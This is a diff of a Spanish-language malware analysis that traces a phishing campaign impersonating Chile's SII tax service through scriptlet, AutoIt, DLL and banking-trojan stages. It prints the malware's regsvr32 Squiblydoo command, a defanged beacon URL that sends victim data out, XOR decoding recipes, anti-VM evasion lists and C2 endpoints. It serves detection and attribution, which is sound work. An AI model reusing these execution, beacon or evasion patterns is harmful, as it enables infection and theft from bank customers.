@@ -368,11 +368,11 @@ Con todos los strings en claro, el flujo de ejecución de esta primera fase qued
 
 ## Fase 2 — Scriptlet de reconocimiento y anti-VM
 
-El **scriptlet `.sct`** que el dropper deja en `%TEMP%` y ejecuta mediante Squiblydoo es la segunda etapa de la cadena. A diferencia del VBS, ya no es un simple descargador: es la rutina de **reconocimiento, evasión y perfilado** de la víctima.
+El **scriptlet .sct** que el dropper deja en **%TEMP%** y ejecuta mediante Squiblydoo es la segunda etapa de la cadena. A diferencia del VBS, ya no es un simple descargador: es la rutina de **reconocimiento, evasión y perfilado** de la víctima.
 
 ![Extracto Scriptlet Fase 2](/assets/images/phishing1/fase2_codigo.png)
 
-Es un XML de scriptlet COM con un bloque **JScript** dentro de `CDATA`, identificado por el **progid `zjzFPuit`** y el **classid `{71795D52-3FEA-497C-ACD7-9180F0CAAD05}`**.
+Es un XML de scriptlet COM con un bloque **JScript** dentro de **CDATA**, identificado por el **progid zjzFPuit** y el **classid {71795D52-3FEA-497C-ACD7-9180F0CAAD05}**.
 
 ### Desofuscación del scriptlet
 
@@ -389,7 +389,7 @@ De la función se desprenden tres puntos:
 * **k[i % l]** indica una **clave rotatoria**: el índice da la vuelta al llegar al final de la clave, repitiéndose sobre todo el arreglo.
 * Cada llamada a **wQfWa(...)** arranca con **i = 0**, por lo que la clave **reinicia en cada arreglo** y cada string se decodifica por separado.
 
-A diferencia del dropper, **la clave no está ofuscada**: `sTArSx` es un arreglo de decimales en texto claro dentro del script. No hay que recuperarla ni derivarla; es exactamente la secuencia de bytes que se usa como clave. Para alimentarla al paso **XOR** de CyberChef se convierte a hexadecimal con una receta trivial:
+A diferencia del dropper, **la clave no está ofuscada**: **sTArSx** es un arreglo de decimales en texto claro dentro del script. No hay que recuperarla ni derivarla; es exactamente la secuencia de bytes que se usa como clave. Para alimentarla al paso **XOR** de CyberChef se convierte a hexadecimal con una receta trivial:
 
 ```
 From_Decimal('Comma',false)
@@ -398,9 +398,9 @@ To_Hex('Space',0)
 
 ![Obtención de la clave XOR](/assets/images/phishing1/fase2_llavexor.png)
 
-> Cuando la clave **no** viene en el script *(se trae remota, se deriva o se borra tras usarse)*, igual se recupera por **known-plaintext**: como XOR es reversible, `clave = cifrado XOR texto_conocido`. Sabiendo que un arreglo es una URL que empieza en `https://` o un ProgID como `WScript`, se despeja la clave byte a byte.
+> Cuando la clave **no** viene en el script *(se trae remota, se deriva o se borra tras usarse)*, igual se recupera por **known-plaintext**: como XOR es reversible, **clave = cifrado XOR texto_conocido**. Sabiendo que un arreglo es una URL que empieza en **https://** o un ProgID como **WScript**, se despeja la clave byte a byte.
 
-Con la clave en hexadecimal, se replica **`wQfWa`** usando **Fork** *(que procesa un arreglo por línea, reiniciando la clave en cada uno)*:
+Con la clave en hexadecimal, se replica **wQfWa** usando **Fork** *(que procesa un arreglo por línea, reiniciando la clave en cada uno)*:
 
 ```
 Fork('\n','\n',false)
@@ -410,7 +410,7 @@ XOR({'option':'Hex','string':'8e 53 6c 89 ab 70 3d 85 af 33 a7 58 70 8c 51 43 9b
 
 ![Decodificación XOR en CyberChef](/assets/images/phishing1/cyberchef_xor.png)
 
-Al aplicar la receta sobre cada arreglo del objeto **`_e`** se obtienen los **ProgID**, rutas **WMI** y la URL de la siguiente etapa:
+Al aplicar la receta sobre cada arreglo del objeto **_e** se obtienen los **ProgID**, rutas **WMI** y la URL de la siguiente etapa:
 
 | **Arreglo** | **Valor decodificado**                                    | **Uso**                              |
 | ----------- | --------------------------------------------------------- | ------------------------------------ |
@@ -424,7 +424,7 @@ Al aplicar la receta sobre cada arreglo del objeto **`_e`** se obtienen los **Pr
 
 ### Reconocimiento del equipo
 
-Con los objetos ya decodificados, el scriptlet perfila el host a partir de cuatro fuentes: **`WScript.Network`** para el nombre de equipo y usuario, la clase WMI **`Win32_OperatingSystem`** para la edición del sistema, y la llave de registro **`HKCU\Control Panel\International\Locale`** para el **LCID**. Cada consulta va envuelta en un `try/catch` que devuelve vacío, de modo que el scriptlet **nunca arroja un error visible** si alguna falla.
+Con los objetos ya decodificados, el scriptlet perfila el host a partir de cuatro fuentes: **WScript.Network** para el nombre de equipo y usuario, la clase WMI **Win32_OperatingSystem** para la edición del sistema, y la llave de registro **HKCU\Control Panel\International\Locale** para el **LCID**. Cada consulta va envuelta en un **try/catch** que devuelve vacío, de modo que el scriptlet **nunca arroja un error visible** si alguna falla.
 
 ### Evasión de análisis (anti-VM)
 
@@ -436,7 +436,7 @@ El núcleo de esta etapa es descartar entornos de análisis. Contrasta el perfil
 | BIOS *(`Win32_BIOS.Version`)* | `VRTUAL, A M I, QEMU, KVM, Xen, Parallels, Bochs`                                                         |
 | Nombre de equipo              | `JOHN-PC, SANDBOX, MALWARE, VIRUS, SAMPLE, CUCKOO, ANALYST, MALTEST, TEQUILA, HACKER, WIN7-PC, USER-PC`   |
 
-Adicionalmente consulta **`root\SecurityCenter2`** para enumerar el **antivirus instalado**. Con esto, el operador conoce el entorno de cada víctima antes de entregar el payload.
+Adicionalmente consulta **root\SecurityCenter2** para enumerar el **antivirus instalado**. Con esto, el operador conoce el entorno de cada víctima antes de entregar el payload.
 
 Cabe señalar que al obtener este mismo scriptlet desde otro dominio de la campaña _(faturamento-modelo-download[.]lat)_ la lógica es idéntica, solo cambian el **progid**, el **classid**, la clave y los nombres de variables, por lo que el kit genera un scriptlet distinto para cada dominio.
 
@@ -444,23 +444,23 @@ Cabe señalar que al obtener este mismo scriptlet desde otro dominio de la campa
 
 ### Check-in y entrega condicional
 
-Toda la información recolectada se envía en un **`GET`** al panel del atacante:
+Toda la información recolectada se envía en un **GET** al panel del atacante:
 
 ```
 hxxps://sii[.]cl-facturas[.]lat/registrar.php?dominio=..&pc=..&user=..&os=..&vm=..&lang=..&mf=..&md=..&bios=..&vmr=..&av=..
 ```
 
-Este beacon se realiza **siempre**, incluso al detectar una máquina virtual *(en cuyo caso el operador recibe la señal de que su muestra está siendo analizada)*. La entrega del payload, en cambio, es condicional: **solo si el equipo no es una VM** el scriptlet descarga la etapa 3 desde `_e.g`, la guarda en **`%TEMP%\<aleatorio>.sct`** mediante **ADODB.Stream** y la ejecuta con un segundo **Squiblydoo**:
+Este beacon se realiza **siempre**, incluso al detectar una máquina virtual *(en cuyo caso el operador recibe la señal de que su muestra está siendo analizada)*. La entrega del payload, en cambio, es condicional: **solo si el equipo no es una VM** el scriptlet descarga la etapa 3 desde **_e.g**, la guarda en **%TEMP%\<aleatorio>.sct** mediante **ADODB.Stream** y la ejecuta con un segundo **Squiblydoo**:
 
 ```
 regsvr32 /s /n /u /i:"%TEMP%\<aleatorio>.sct" scrobj.dll
 ```
 
-La respuesta del servidor aporta un dato de atribución: el panel confirma el registro con un mensaje en **portugués** *(`Execução registrada com sucesso`)*. El señuelo es chileno y suplanta al **SII**, pero el backend es el mismo panel de habla portuguesa observado en campañas previas de la operación, lo que apunta a un **kit brasileño reutilizado** para apuntar a Chile.
+La respuesta del servidor aporta un dato de atribución: el panel confirma el registro con un mensaje en **portugués** *(**Execução registrada com sucesso**)*. El señuelo es chileno y suplanta al **SII**, pero el backend es el mismo panel de habla portuguesa observado en campañas previas de la operación, lo que apunta a un **kit brasileño reutilizado** para apuntar a Chile.
 
 ![Respuesta del panel en portugués](/assets/images/phishing1/f3_registromuestra.png)
 
-Por último, la correlación entre etapas: el parámetro **`r=`** de este scriptlet y de la URL de la etapa 3 es **el mismo token** del dropper. Se trata del identificador de campaña o víctima que **enlaza las tres fases** como una única cadena de infección.
+Por último, la correlación entre etapas: el parámetro **r=** de este scriptlet y de la URL de la etapa 3 es **el mismo token** del dropper. Se trata del identificador de campaña o víctima que **enlaza las tres fases** como una única cadena de infección.
 
 ## Fase 3 — Descargador del payload ("FluxEngine")
 
@@ -468,11 +468,11 @@ Cuando el equipo **no** es una máquina virtual, la Fase 2 descarga y ejecuta es
 
 ![Extracto Scriptlet Fase 3](/assets/images/phishing1/fase3_xor.png)
 
-Es un nuevo scriptlet COM con **progid `ApZxsWtQ`** y **classid `{F4BCDA9A-EB58-42BC-AD0F-A2874ADFCDA0}`**.
+Es un nuevo scriptlet COM con **progid ApZxsWtQ** y **classid {F4BCDA9A-EB58-42BC-AD0F-A2874ADFCDA0}**.
 
 ### Desofuscación del scriptlet
 
-Usa el mismo **XOR de clave rotatoria** de la Fase 2 *(aquí la función se llama `rVKY`)*, pero con una **clave distinta**, el arreglo `GnqLx` de 15 bytes. El procedimiento es idéntico: primero se extrae la clave a hexadecimal desde el arreglo en texto claro,
+Usa el mismo **XOR de clave rotatoria** de la Fase 2 *(aquí la función se llama **rVKY**)*, pero con una **clave distinta**, el arreglo **GnqLx** de 15 bytes. El procedimiento es idéntico: primero se extrae la clave a hexadecimal desde el arreglo en texto claro,
 
 ```
 From_Decimal('Comma',false)
@@ -481,7 +481,7 @@ To_Hex('Space',0)
 
 ![Obtención de la clave XOR](/assets/images/phishing1/fase3_xor_cyberchef.png)
 
-y luego se decodifican los arreglos del objeto `_e` con **Fork** *(un arreglo por línea, reiniciando la clave en cada uno)*:
+y luego se decodifican los arreglos del objeto **_e** con **Fork** *(un arreglo por línea, reiniciando la clave en cada uno)*:
 
 ```
 Fork('\n','\n',false)
@@ -511,7 +511,7 @@ El resultado expone los **ProgID**, las llaves de registro, los **endpoints de d
 
 ### Identificación del equipo (hostId)
 
-Antes de descargar, el scriptlet genera un **hostId** determinístico: concatena `%COMPUTERNAME%` y `%USERNAME%` y los pasa por un hash que produce una cadena de **8 letras minúsculas**. Como depende solo del equipo y el usuario, **el mismo host siempre genera el mismo id**, lo que da idempotencia *(si ya está instalado, no reinstala)* y sirve como parámetro `h=` en las descargas.
+Antes de descargar, el scriptlet genera un **hostId** determinístico: concatena **%COMPUTERNAME%** y **%USERNAME%** y los pasa por un hash que produce una cadena de **8 letras minúsculas**. Como depende solo del equipo y el usuario, **el mismo host siempre genera el mismo id**, lo que da idempotencia *(si ya está instalado, no reinstala)* y sirve como parámetro **h=** en las descargas.
 
 ![Generación del hostId](/assets/images/phishing1/personi_triage.png)
 
@@ -525,71 +525,71 @@ El scriptlet inicia borrando rastros y marcando el sistema:
 
 ### Descarga y despliegue del payload
 
-Descarga tres archivos **ZIP** desde el endpoint `/d/<ruta>`, diferenciados por el parámetro `f=`: `f=autoit` *(el intérprete legítimo AutoIt3)*, `f=a3x` *(el script compilado del banker)* y `f=icone` *(un icono)*. Cada ZIP se guarda con **ADODB.Stream**, se descomprime con **Shell.Application** `CopyHere` y se elimina. Los artefactos quedan renombrados al hostId: `<hostId>.exe`, `<hostId>` y `<hostId>.ico`.
+Descarga tres archivos **ZIP** desde el endpoint **/d/<ruta>**, diferenciados por el parámetro **f=**: **f=autoit** *(el intérprete legítimo AutoIt3)*, **f=a3x** *(el script compilado del banker)* y **f=icone** *(un icono)*. Cada ZIP se guarda con **ADODB.Stream**, se descomprime con **Shell.Application** **CopyHere** y se elimina. Los artefactos quedan renombrados al hostId: **<hostId>.exe**, **<hostId>** y **<hostId>.ico**.
 
 ![Descarga y descompresión de los ZIP](/assets/images/phishing1/fase3_descargadezips.png)
 
 ### Ejecución y ocultamiento
 
-Con el intérprete y el script en disco, ejecuta **`AutoIt3.exe <script>`** de forma oculta mediante `ShellExecute`, y luego aplica **`attrib +h +s`** a la carpeta para marcarla como oculta y de sistema. El script `.a3x` lleva una **DLL embebida** que mapea directamente en memoria, por lo que nunca toca disco como `.dll`. Esa DLL no es el banker final, sino el **cargador** que se analiza en la Fase 5.
+Con el intérprete y el script en disco, ejecuta **AutoIt3.exe <script>** de forma oculta mediante **ShellExecute**, y luego aplica **attrib +h +s** a la carpeta para marcarla como oculta y de sistema. El script **.a3x** lleva una **DLL embebida** que mapea directamente en memoria, por lo que nunca toca disco como **.dll**. Esa DLL no es el banker final, sino el **cargador** que se analiza en la Fase 5.
 
 ### Telemetría
 
-A lo largo del proceso reporta su estado al panel vía `registrar.php?acao=log`, con los valores `iniciando`, `ja_instalado`, `baixado`, `executado` o `erro_exe_nao_existe`. El estado final `dll_ok` lo envía la propia DLL una vez cargada.
+A lo largo del proceso reporta su estado al panel vía **registrar.php?acao=log**, con los valores **iniciando**, **ja_instalado**, **baixado**, **executado** o **erro_exe_nao_existe**. El estado final **dll_ok** lo envía la propia DLL una vez cargada.
 
 ### Correlación
 
-Dos elementos refuerzan que es la misma operación de las campañas previas: el nombre interno **FluxEngine** en las llaves de registro, y los **comentarios en portugués** dentro del propio código *(`Só grava rastreador/domínio em nova instalação`, `instalado será reportado pela DLL`)*. El señuelo es el **SII** de Chile, pero el builder y el operador son los mismos de habla portuguesa.
+Dos elementos refuerzan que es la misma operación de las campañas previas: el nombre interno **FluxEngine** en las llaves de registro, y los **comentarios en portugués** dentro del propio código *(**Só grava rastreador/domínio em nova instalação**, **instalado será reportado pela DLL**)*. El señuelo es el **SII** de Chile, pero el builder y el operador son los mismos de habla portuguesa.
 
-## Fase 4 — Loader AutoIt (el `.a3x`)
+## Fase 4 — Loader AutoIt (el **.a3x**)
 
 Los tres **ZIP** que descarga la fase anterior contienen el intérprete, el script y el icono, cada uno renombrado al hostId del equipo.
 
 ![Descarga de los ZIP](/assets/images/phishing1/fase4_download_dropper.png)
 
-El `.a3x` del `a2.zip` —renombrado al hostId y sin extensión— es el **loader** que despliega la DLL. Al descompilarlo *(con `UnAutoIt`/`myAut2Exe`)* se confirma que la **DLL viaja embebida** dentro del propio script, como un blob en la variable `$DLLBINARY`. Los otros dos archivos son contexto: `<hostId>.exe` es el intérprete **AutoIt3 legítimo** *(firmado por AUTOIT CONSULTING LTD)* y `<hostId>.ico` es solo el icono.
+El **.a3x** del **a2.zip** —renombrado al hostId y sin extensión— es el **loader** que despliega la DLL. Al descompilarlo *(con **UnAutoIt**/**myAut2Exe**)* se confirma que la **DLL viaja embebida** dentro del propio script, como un blob en la variable **$DLLBINARY**. Los otros dos archivos son contexto: **<hostId>.exe** es el intérprete **AutoIt3 legítimo** *(firmado por AUTOIT CONSULTING LTD)* y **<hostId>.ico** es solo el icono.
 
 ![Loader AutoIt descompilado](/assets/images/phishing1/fase4_a3x_descompilado.png)
 
-Antes de desplegar nada, el loader espera a tener conectividad real: la función `_AGUARDAINTERNET` consulta en bucle `msftconnecttest.com` hasta recibir respuesta. Es un **gate de ejecución** que, de paso, descarta entornos de análisis sin salida a internet. Confirmada la red, extrae la DLL del `$DLLBINARY` y la ejecuta en memoria. Los nombres de función en portugués *(`_AGUARDAINTERNET`)* son el primer indicio de atribución de esta etapa.
+Antes de desplegar nada, el loader espera a tener conectividad real: la función **_AGUARDAINTERNET** consulta en bucle **msftconnecttest.com** hasta recibir respuesta. Es un **gate de ejecución** que, de paso, descarta entornos de análisis sin salida a internet. Confirmada la red, extrae la DLL del **$DLLBINARY** y la ejecuta en memoria. Los nombres de función en portugués *(**_AGUARDAINTERNET**)* son el primer indicio de atribución de esta etapa.
 
-Cabe señalar que el loader guarda la ruta de instalación en la variable de entorno **`HOLLOW_DIR`**, que corresponde al directorio base que utiliza posteriormente la DLL.
+Cabe señalar que el loader guarda la ruta de instalación en la variable de entorno **HOLLOW_DIR**, que corresponde al directorio base que utiliza posteriormente la DLL.
 
-Por otro lado, al revisar los otros dos archivos en **VirusTotal**, el intérprete es detectado por solo 1 de 69 motores y figura como legítimo y firmado, mientras que el icono no presenta detecciones. Es decir, ninguno de los archivos que quedan en disco es malicioso por sí solo, la lógica se encuentra en el `.a3x` y en la DLL que este carga en memoria.
+Por otro lado, al revisar los otros dos archivos en **VirusTotal**, el intérprete es detectado por solo 1 de 69 motores y figura como legítimo y firmado, mientras que el icono no presenta detecciones. Es decir, ninguno de los archivos que quedan en disco es malicioso por sí solo, la lógica se encuentra en el **.a3x** y en la DLL que este carga en memoria.
 
 ![Revisión en VirusTotal](/assets/images/phishing1/revision_vt.png)
 
-## Fase 5 — DLL bancaria (`dll_sii.bin`)
+## Fase 5 — DLL bancaria (**dll_sii.bin**)
 
-La DLL extraída del `$DLLBINARY` es el componente con la lógica real. Analizada en **IDA**, su rutina principal se identifica sola por los logs que trae compilados: `ExecutarHollowing`. No es el banker final en sí, sino el **cargador** que lo trae y lo inyecta.
+La DLL extraída del **$DLLBINARY** es el componente con la lógica real. Analizada en **IDA**, su rutina principal se identifica sola por los logs que trae compilados: **ExecutarHollowing**. No es el banker final en sí, sino el **cargador** que lo trae y lo inyecta.
 
 ![Análisis de la DLL en IDA](/assets/images/phishing1/Fase5_analisisdll.png)
 
 ### Descarga del payload en memoria
 
-La DLL descarga la siguiente etapa desde una **URL hardcodeada** *(`<C2>/api/source-file.php?f=d3dx9_43.bin`)*. El nombre del archivo es un detalle de evasión: `d3dx9_43.bin` imita una librería de **DirectX** *(masquerading)*, de modo que, a ojos de un analista apurado o un filtro por nombre, pasa por un componente legítimo. La descarga se hace **en memoria vía wininet**, por lo que el payload nunca se escribe como archivo en disco. Como el nombre está compilado en la DLL, cambiarlo exige recompilar, lo que lo vuelve un **IoC estable** entre muestras.
+La DLL descarga la siguiente etapa desde una **URL hardcodeada** *(**<C2>/api/source-file.php?f=d3dx9_43.bin**)*. El nombre del archivo es un detalle de evasión: **d3dx9_43.bin** imita una librería de **DirectX** *(masquerading)*, de modo que, a ojos de un analista apurado o un filtro por nombre, pasa por un componente legítimo. La descarga se hace **en memoria vía wininet**, por lo que el payload nunca se escribe como archivo en disco. Como el nombre está compilado en la DLL, cambiarlo exige recompilar, lo que lo vuelve un **IoC estable** entre muestras.
 
 ![Descarga del payload en memoria](/assets/images/phishing1/fase5_payloadmemoria.png)
 
 ### Descifrado en memoria
 
-El payload no llega en claro: viaja **cifrado** y la DLL lo descifra en memoria en **dos etapas de AES** *(vía las APIs de **bcrypt/CNG** de Windows)*. El esquema usa una **clave embebida en la propia muestra** que abre una clave de sesión, y esta descifra el bloque principal hasta obtener un **PE** *(validado por la firma `MZ`)*. El objetivo es simple: el ejecutable real **nunca existe en texto claro en disco**, lo que derrota al análisis estático y a las firmas por archivo. Esa clave embebida, al mantenerse entre campañas, sirve además como **ancla de familia** para reglas de detección. En términos de MITRE, es **T1027.013** *(payload cifrado)* y **T1140** *(descifrado en runtime)*.
+El payload no llega en claro: viaja **cifrado** y la DLL lo descifra en memoria en **dos etapas de AES** *(vía las APIs de **bcrypt/CNG** de Windows)*. El esquema usa una **clave embebida en la propia muestra** que abre una clave de sesión, y esta descifra el bloque principal hasta obtener un **PE** *(validado por la firma **MZ**)*. El objetivo es simple: el ejecutable real **nunca existe en texto claro en disco**, lo que derrota al análisis estático y a las firmas por archivo. Esa clave embebida, al mantenerse entre campañas, sirve además como **ancla de familia** para reglas de detección. En términos de MITRE, es **T1027.013** *(payload cifrado)* y **T1140** *(descifrado en runtime)*.
 
 ![Cadena de descifrado del payload](/assets/images/phishing1/fase5_Buscar_xref_descifrado.png)
 
 ### Inyección por process hollowing
 
-Con el PE ya descifrado en memoria, la DLL lo ejecuta mediante **process hollowing** *(**T1055.012**)*: crea un proceso legítimo en estado suspendido, reemplaza su imagen en memoria por el código malicioso y lo reanuda, de forma que el banker corre **bajo la identidad de un proceso de confianza**, sin que aparezca un binario sospechoso en el árbol de procesos. Antes de inyectar, la DLL consulta la versión del sistema *(`RtlGetVersion`)* para decidir entre el hollowing y un **modo directo** alternativo. Para la defensa, esto implica que la detección no puede basarse en el nombre del proceso, sino en el patrón de **creación suspendida + escritura de memoria remota + reanudación** desde un proceso inesperado.
+Con el PE ya descifrado en memoria, la DLL lo ejecuta mediante **process hollowing** *(**T1055.012**)*: crea un proceso legítimo en estado suspendido, reemplaza su imagen en memoria por el código malicioso y lo reanuda, de forma que el banker corre **bajo la identidad de un proceso de confianza**, sin que aparezca un binario sospechoso en el árbol de procesos. Antes de inyectar, la DLL consulta la versión del sistema *(**RtlGetVersion**)* para decidir entre el hollowing y un **modo directo** alternativo. Para la defensa, esto implica que la detección no puede basarse en el nombre del proceso, sino en el patrón de **creación suspendida + escritura de memoria remota + reanudación** desde un proceso inesperado.
 
 ### Atribución
 
-La DLL es un **build release**: el logging está compilado como *stubs* *(los strings quedan en el binario, pero las funciones están vacías)*, un patrón de versión de producción. Esos strings —`ExecutarHollowing`, `DecifrarPayload`, `BaixarPayloadMemoria`, `Baixando payload em memoria`— están en **portugués**, consistentes con el operador pt-BR de toda la cadena. El perfil *(loader AutoIt + banker final con overlays bancarios, descarga cifrada, hollowing)* encaja con el cluster de **bankers LATAM** de habla portuguesa. La familia concreta se confirma con el **C2 de exfiltración** y la **lista de bancos objetivo**, que se detallan en la siguiente fase una vez descifrado el payload.
+La DLL es un **build release**: el logging está compilado como *stubs* *(los strings quedan en el binario, pero las funciones están vacías)*, un patrón de versión de producción. Esos strings —**ExecutarHollowing**, **DecifrarPayload**, **BaixarPayloadMemoria**, **Baixando payload em memoria**— están en **portugués**, consistentes con el operador pt-BR de toda la cadena. El perfil *(loader AutoIt + banker final con overlays bancarios, descarga cifrada, hollowing)* encaja con el cluster de **bankers LATAM** de habla portuguesa. La familia concreta se confirma con el **C2 de exfiltración** y la **lista de bancos objetivo**, que se detallan en la siguiente fase una vez descifrado el payload.
 
-## Fase 6 — Payload bancario (`d3dx9_43.bin`)
+## Fase 6 — Payload bancario (**d3dx9_43.bin**)
 
-El archivo `d3dx9_43.bin` que descarga y descifra la Fase 5 es el **payload final** de la cadena: el troyano bancario. Su nombre imita una librería de **DirectX** _(masquerading)_ y nunca se escribe en disco, sino que se descifra y ejecuta directamente en memoria. Una vez descifrado el blob hasta el `MZ`, el payload resulta ser un **PE compilado en Delphi** _(confirmado por las llaves `Software\CodeGear\Locales`)_ y sin empacar, de la rama **Casbaneiro / Mekotio** del ecosistema de bankers brasileños **Tetrade**.
+El archivo **d3dx9_43.bin** que descarga y descifra la Fase 5 es el **payload final** de la cadena: el troyano bancario. Su nombre imita una librería de **DirectX** _(masquerading)_ y nunca se escribe en disco, sino que se descifra y ejecuta directamente en memoria. Una vez descifrado el blob hasta el **MZ**, el payload resulta ser un **PE compilado en Delphi** _(confirmado por las llaves **Software\CodeGear\Locales**)_ y sin empacar, de la rama **Casbaneiro / Mekotio** del ecosistema de bankers brasileños **Tetrade**.
 
-A diferencia de las etapas anteriores, la configuración del banker se descifra en memoria en tiempo de ejecución, por lo que un `strings` sobre el binario en disco no entrega nada útil. Tras volcar la memoria una vez descifrado, se obtiene la configuración real del malware.
+A diferencia de las etapas anteriores, la configuración del banker se descifra en memoria en tiempo de ejecución, por lo que un **strings** sobre el binario en disco no entrega nada útil. Tras volcar la memoria una vez descifrado, se obtiene la configuración real del malware.
 
 ### Obtención de la configuración vía Cloudflare
 
@@ -604,7 +604,7 @@ El banker no lleva su C2 hardcodeado, sino que lo resuelve de forma dinámica co
 | Geolocalización / IP pública     | `ip-api.com/line/?fields=query`                                      |
 | Telemetría de estado             | `/registrar.php?acao=log&status=`                                    |
 
-El uso de **ip-api.com** le permite obtener la IP pública y el país de la víctima, mientras que `/registrar.php?acao=log` es el mismo endpoint de telemetría de las etapas anteriores, lo que vuelve a enlazar el payload con el resto de la cadena.
+El uso de **ip-api.com** le permite obtener la IP pública y el país de la víctima, mientras que **/registrar.php?acao=log** es el mismo endpoint de telemetría de las etapas anteriores, lo que vuelve a enlazar el payload con el resto de la cadena.
 
 ### Persistencia y evasión
 
@@ -648,7 +648,7 @@ El binario incluye una lista de artefactos que comprueba en el equipo y de los c
 | Extensiones de wallet _(navegador)_ | MetaMask, OKX, Trust Wallet, Exodus, Coinbase, Phantom, Rabby, Enkrypt, Coinomi |
 | Aplicaciones de wallet _(escritorio)_ | Exodus, Atomic, Electrum, Ledger Live, Trezor Suite                       |
 
-Las extensiones se identifican por su **ID de extensión de Chrome** _(ej. MetaMask `nkbihfbeogaeaoehlefnkodbefgpgknn`)_, lo que le permite detectar su instalación directamente en el perfil del navegador. La presencia de módulos antifraude como **Warsaw** _(GAS Tecnologia, usado por la banca brasileña)_ y **scpbradguard** confirma que el objetivo principal es el cliente bancario de Brasil, mientras que la inclusión de wallets posiciona al payload también como **stealer de criptomonedas**.
+Las extensiones se identifican por su **ID de extensión de Chrome** _(ej. MetaMask **nkbihfbeogaeaoehlefnkodbefgpgknn**)_, lo que le permite detectar su instalación directamente en el perfil del navegador. La presencia de módulos antifraude como **Warsaw** _(GAS Tecnologia, usado por la banca brasileña)_ y **scpbradguard** confirma que el objetivo principal es el cliente bancario de Brasil, mientras que la inclusión de wallets posiciona al payload también como **stealer de criptomonedas**.
 
 ### Comportamiento
 
@@ -656,13 +656,13 @@ Con los objetivos definidos, el banker monitorea las ventanas y procesos del equ
 
 # Infraestructura Gestionada vía Cloudflare
 
-Durante la revisión de la DLL _(Fase 5)_ se identificó, además de la URL de descarga, un **token de autorización** embebido en el binario, que la muestra utiliza en la cabecera **`Authorization: Bearer`** de sus peticiones hacia la **API de Cloudflare**.
+Durante la revisión de la DLL _(Fase 5)_ se identificó, además de la URL de descarga, un **token de autorización** embebido en el binario, que la muestra utiliza en la cabecera **Authorization: Bearer** de sus peticiones hacia la **API de Cloudflare**.
 
 ![Petición a la API de Cloudflare (token Bearer)](/assets/images/phishing1/fase5_cloudflare.png)
 
 El hallazgo es relevante, dado que el operador no utiliza Cloudflare únicamente como proxy, sino como **backend de configuración** de toda la operación. Los registros DNS de cada dominio almacenan la URL del payload, la versión del kit y la del C2, que el propio malware consulta para funcionar. Al quedar el token expuesto en la muestra, es posible revisar la actividad registrada en esa cuenta.
 
-Cabe señalar que las **46 zonas** de esta cuenta no corresponden a los más de 200 dominios de phishing analizados anteriormente, sino a la infraestructura de **comando y control del banker** _(componentes de acceso remoto, versiones y C2)_. Ambas capas se enlazan mediante **remoto[.]painelst[.]com**, que es a la vez el valor de `lurlsource` en esta cuenta y el panel identificado en Shodan.
+Cabe señalar que las **46 zonas** de esta cuenta no corresponden a los más de 200 dominios de phishing analizados anteriormente, sino a la infraestructura de **comando y control del banker** _(componentes de acceso remoto, versiones y C2)_. Ambas capas se enlazan mediante **remoto[.]painelst[.]com**, que es a la vez el valor de **lurlsource** en esta cuenta y el panel identificado en Shodan.
 
 > Se automatizó la recolección de esta información, pero por motivos éticos no se divulgan las técnicas empleadas. A continuación se presenta únicamente el análisis de los datos obtenidos.
 
@@ -691,7 +691,7 @@ Cada dominio no guarda únicamente su registro **A**. El kit crea una serie de s
 | `lremoto` / `lurlsource`         | URL del C2                       | `https://remoto[.]painelst[.]com`   |
 | `bremote` / `bhtmls` / `bsource` | Marca de tiempo del build       | `20260715120000`                    |
 
-De aquí se desprende la correlación que cierra el análisis: el valor de **`lurlsource`** apunta a **remoto[.]painelst[.]com**, el mismo panel identificado previamente en Shodan. Es decir, el panel del operador, la configuración en DNS y la muestra analizada forman parte de una única infraestructura.
+De aquí se desprende la correlación que cierra el análisis: el valor de **lurlsource** apunta a **remoto[.]painelst[.]com**, el mismo panel identificado previamente en Shodan. Es decir, el panel del operador, la configuración en DNS y la muestra analizada forman parte de una única infraestructura.
 
 ## Evolución del kit
 
@@ -718,7 +718,7 @@ Las 508 URLs de distribución se reparten en 14 hosts, que confirman la migraci�
 | `54.39.160.206`                          | 16       | GEN-1               |
 | `remoto[.]ddins[.]click` _(:444)_        | 10       | GEN-3 _(C2)_        |
 
-Cabe señalar que los hosts con puerto **`:444`** exponen el endpoint **`/api/source-file.php?f=`**, el mismo patrón de descarga que se encuentra hardcodeado en la DLL de la Fase 5, lo que confirma que el C2 de exfiltración pertenece a esta serie de servidores. Adicionalmente, parte del payload se alojó en **sitios legítimos comprometidos** _(`oalbertino-folgosinho[.]com`, `agdapiazzon[.]com[.]br`)_, lo que entrega al archivo la reputación de un dominio con historial.
+Cabe señalar que los hosts con puerto **:444** exponen el endpoint **/api/source-file.php?f=**, el mismo patrón de descarga que se encuentra hardcodeado en la DLL de la Fase 5, lo que confirma que el C2 de exfiltración pertenece a esta serie de servidores. Adicionalmente, parte del payload se alojó en **sitios legítimos comprometidos** _(**oalbertino-folgosinho[.]com**, **agdapiazzon[.]com[.]br**)_, lo que entrega al archivo la reputación de un dominio con historial.
 
 ## Puntos relevantes
 
